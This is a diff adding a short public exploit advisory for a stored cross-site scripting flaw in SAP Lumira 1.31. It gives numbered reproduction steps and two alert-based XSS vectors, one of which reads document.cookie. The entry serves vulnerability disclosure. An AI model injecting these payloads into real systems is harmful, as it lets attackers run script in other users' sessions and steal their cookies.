@@ -1,0 +1,26 @@
+# Exploit Title: SAP Lumira 1.31 - Stored Cross-Site Scripting
+# Date: 13.08.2020
+# Exploit Author: Ilca Lucian Florin
+# Vendor Homepage: https://www.sap.com
+# Software Link: SAP Lumira
+# Version: <= 1.31
+# Tested on: Windows 7 / Windows 10 / Internet Explorer 11 / Google Chrome 84.0.4147.105
+
+# Vulnerable System: https://system/BOE/BI
+
+# Reproduce Cross Site Scripting (XSS):
+
+1. Select Web Intelligence Button
+2. Wait for SAP Business Objects to load complete
+3. CTRL +N or click on New Document
+4. Create an empty document
+5. Select new variable
+6. Select random name for the variable
+7. Add the XSS vectors from evidence
+8. Open variable tab and click on new created variable name
+
+# Cross Site Scripting (XSS) Vectors Used:
+
+• "><h1><IFRAME SRC=#
+onmouseover="alert(document.cookie)"></IFRAME>123</h1>
+• <IMG SRC=x onerror="alert(String.fromCharCode(88,83,83))">
